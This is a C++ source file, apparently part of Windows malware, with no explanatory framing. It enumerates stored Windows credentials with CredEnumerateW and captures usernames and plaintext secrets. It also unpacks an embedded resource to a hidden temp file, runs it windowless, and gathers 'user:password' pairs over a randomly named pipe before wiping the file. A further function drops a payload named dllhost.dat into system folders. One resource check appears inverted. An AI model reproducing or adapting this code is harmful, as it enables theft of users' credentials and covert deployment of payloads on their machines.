#include "ZCollectAccount.h"
#include "ZSystemCmd.h"
#include "ZCompress.h"
#include "ZFile.h"

#include <WInCred.h>
#include <Shlwapi.h>
#include <Shlobj.h>

void GetAllAccount()
{
	g_szAccountInfo[0] = 0;

	int nLen = 0;
	WCHAR wcsAccount[1024] = { 0 };
	StringInfo* pStringInfo = NULL;
	CZVector::iterator* it = g_pObj2->GetString(1, &pStringInfo);
	if (NULL != it)
	{
		do
		{
			wsprintfW(wcsAccount, L" \"%ws:%ws\"", pStringInfo->m_pAryStrs[0], pStringInfo->m_pAryStrs[1]);
			nLen += wcslen(wcsAccount);
			if (nLen >= 8181)
			{
				break;
			}

			StrCatW(g_szAccountInfo, wcsAccount);
			pStringInfo = NULL;
		} while (g_pObj2->GetString(it, &pStringInfo));
		delete it;
	}
	
	g_bGetAccount = FALSE;
}

BOOL AddStringByTwo(WCHAR *pArg1, WCHAR *pArg2, DWORD dwMark)
{
	WCHAR *pAdd[2] = { NULL };
	pAdd[0] = new WCHAR[wcslen(pArg1) + 1];
	wcscpy(pAdd[0], pArg1);
	pAdd[1] = new WCHAR[wcslen(pArg2) + 1];
	wcscpy(pAdd[1], pArg2);
	return g_pObj2->AddData(pAdd, dwMark);
}

BOOL GetOtherUserAcc(CZVector *pSet)
{
	DWORD dwCount = 0;
	PCREDENTIALW *pCredential = NULL;
	BOOL bRet = CredEnumerateW(NULL, 0, &dwCount, &pCredential);
	if (bRet)
	{
		for (int i = 0; i < dwCount; i++)
		{
			if (NULL != pCredential[i]->TargetName)
			{
				if (wcsncmp(pCredential[i]->TargetName, L"TERMSRV/", 8) != 0
					&& (CRED_TYPE_GENERIC == pCredential[i]->Type))
				{
					if (NULL != pCredential[i]->UserName
						&& NULL != pCredential[i]->CredentialBlob)
					{
						AddStringByTwo(pCredential[i]->UserName, (WCHAR*)pCredential[i]->CredentialBlob, 0);
					}
					pSet->AddString(pCredential[i]->TargetName + 8, 0);
				}
				else if (CRED_TYPE_DOMAIN_PASSWORD == pCredential[i]->Type)
				{
					pSet->AddString(pCredential[i]->TargetName + 8, 0);
				}
			}
		}
		CredFree(pCredential);
	}
	return bRet;
}


DWORD __stdcall PipeCollectAccountsProc(LPVOID pParam)
{
	SECURITY_ATTRIBUTES tagSA = { 0 };
	PSECURITY_DESCRIPTOR pSD = new SECURITY_DESCRIPTOR;
	memset(pSD, 0, 20);
	tagSA.nLength = sizeof(SECURITY_ATTRIBUTES);
	tagSA.bInheritHandle = FALSE;
	tagSA.lpSecurityDescriptor = pSD;
	if (InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION))
	{
		if (SetSecurityDescriptorDacl(pSD, TRUE, NULL, 0))
		{
			while (TRUE)
			{
				HANDLE hNamedPipe = CreateNamedPipeW((WCHAR*)pParam, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE, 1, 0, 0, 0, &tagSA);
				if (INVALID_HANDLE_VALUE == hNamedPipe)
				{
					continue;
				}

				if (ConnectNamedPipe(hNamedPipe, NULL))
				{
					DWORD dwTotalBytesAvail = 0;
					for (int i = 0; i < 30; i++)
					{
						if (!PeekNamedPipe(hNamedPipe, NULL, 0, NULL, &dwTotalBytesAvail, NULL))
						{
							continue;
						}

						if (0 != dwTotalBytesAvail)
						{
							PBYTE pData = new BYTE[dwTotalBytesAvail];
							DWORD dwNumberOfBytesRead = 0;
							if (ReadFile(hNamedPipe, pData, dwTotalBytesAvail, &dwNumberOfBytesRead, NULL))
							{
								if (dwTotalBytesAvail == dwNumberOfBytesRead)
								{
									WCHAR*pSecSrc = StrChrW((WCHAR *)pData, L':');
									if (NULL != pSecSrc)
									{
										*pSecSrc = 0;
										pSecSrc++;
										AddStringByTwo((WCHAR *)pData, pSecSrc, 2);
									}
								}
							}
							delete pSD;
							break;
						}
						else
						{
							Sleep(1000);
						}
					}
					FlushFileBuffers(hNamedPipe);
					DisconnectNamedPipe(hNamedPipe);
				}
				CloseHandle(hNamedPipe);
			}
		}
	}
	return 0;
}

BOOL CollectAccounts()
{
	BOOL bRet = FALSE;
	HANDLE hThread = NULL;
	BOOL bWow64 = CheckIsWow64Process();
	HRSRC hRsrc = FindResourceW(g_hModule, MAKEINTRESOURCE((LPCWSTR)(bWow64 ? 2 : 1)), RT_RCDATA);
	if (NULL == hRsrc)
	{
		LPVOID pUncompressData = NULL;
		DWORD dwUncompressSize = 0;
		UncompressResource((PBYTE *)&pUncompressData, &dwUncompressSize, hRsrc);
		WCHAR szTempPath[MAX_PATH] = { 0 };
		if (GetTempPathW(MAX_PATH, szTempPath))
		{
			WCHAR szTempFileName[MAX_PATH] = { 0 };
			if (GetTempFileNameW(szTempPath, NULL, 0, szTempFileName))
			{
				GUID guid;
				if (S_OK == CoCreateGuid(&guid))
				{
					LPOLESTR strClassID = NULL;
					if (S_OK == StringFromCLSID(guid, &strClassID))
					{
						if (ZWriteHiddenFile(szTempFileName, pUncompressData, dwUncompressSize))
						{
							WCHAR szPipeName[1024] = { 0 };
							wsprintfW(szPipeName, L"\\\\.\\pipe\\%ws", strClassID);
							hThread = CreateThread(NULL, NULL, PipeCollectAccountsProc, szPipeName, NULL, NULL);
							if (NULL != hThread)
							{
								PROCESS_INFORMATION tagProcessInformation;
								STARTUPINFOW  tagStartupInfo;
								WCHAR szCommandLine[1024] = { 0 };
								memset(&tagProcessInformation, 0, sizeof(PROCESS_INFORMATION));
								memset(&tagStartupInfo, 0, sizeof(STARTUPINFOW));
								wsprintfW(szCommandLine, L"\"%ws\" %ws", szTempFileName, szPipeName);
								if (CreateProcessW(szTempFileName, szCommandLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &tagStartupInfo, &tagProcessInformation))
								{
									WaitForSingleObject(tagProcessInformation.hProcess, 60000);
									g_pObj2->SetCollectComplete();
									TerminateThread(hThread, 0);
								}
								CloseHandle(hThread);
							}

							if (0 != dwUncompressSize)
							{
								memset(pUncompressData, 0, dwUncompressSize);
							}
							ZWriteHiddenFile(szTempFileName, pUncompressData, dwUncompressSize);
							DeleteFileW(szTempFileName);
						}
						CoTaskMemFree(strClassID);
					}
				}
			}
		}

		bRet = HeapFree(GetProcessHeap(), 0, pUncompressData);
	}
	return bRet;
}


BOOL ExtractDllHost_dat(DWORD dwCurPrivilege)
{
	BOOL bRet = FALSE;
	DWORD dwErrCode = 0;
	HRSRC hRsrc = FindResourceW(g_hModule, MAKEINTRESOURCE(3), RT_RCDATA);
	if (NULL != hRsrc)
	{
		PBYTE pUncompressData = NULL;
		DWORD dwUncompressSize = 0;
		UncompressResource(&pUncompressData, &dwUncompressSize, hRsrc);
		g_pszDllhostPath = new WCHAR[MAX_PATH];
		memset(g_pszDllhostPath, 0, MAX_PATH * sizeof(WCHAR));
		DWORD dwStrLen = 0;
		if (0 != dwCurPrivilege)
		{
			dwStrLen = GetWindowsDirectoryW(g_pszDllhostPath, MAX_PATH);
		}
		else if (SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, NULL, g_pszDllhostPath))
		{
			dwStrLen = wcslen(g_pszDllhostPath);
		}

		if (0 != dwStrLen && (dwStrLen + 12) < MAX_PATH)
		{
			PathAppendW(g_pszDllhostPath, L"dllhost.dat");
		}
		else
		{
			delete[]g_pszDllhostPath;
			g_pszDllhostPath = NULL;
		}

		if (NULL != g_pszDllhostPath)
		{
			if (!ZWriteNormalFile(g_pszDllhostPath, pUncompressData, dwUncompressSize, FALSE))
			{
				dwErrCode = GetLastError();
				if (0x50 != dwErrCode)
				{
					dwErrCode = 0;
					bRet = TRUE;
				}
			}
			else
			{
				bRet = TRUE;
			}
		}
		memset(pUncompressData, 0, dwUncompressSize);
		delete[]pUncompressData;
	}
	SetLastError(dwErrCode);
	return bRet;
}
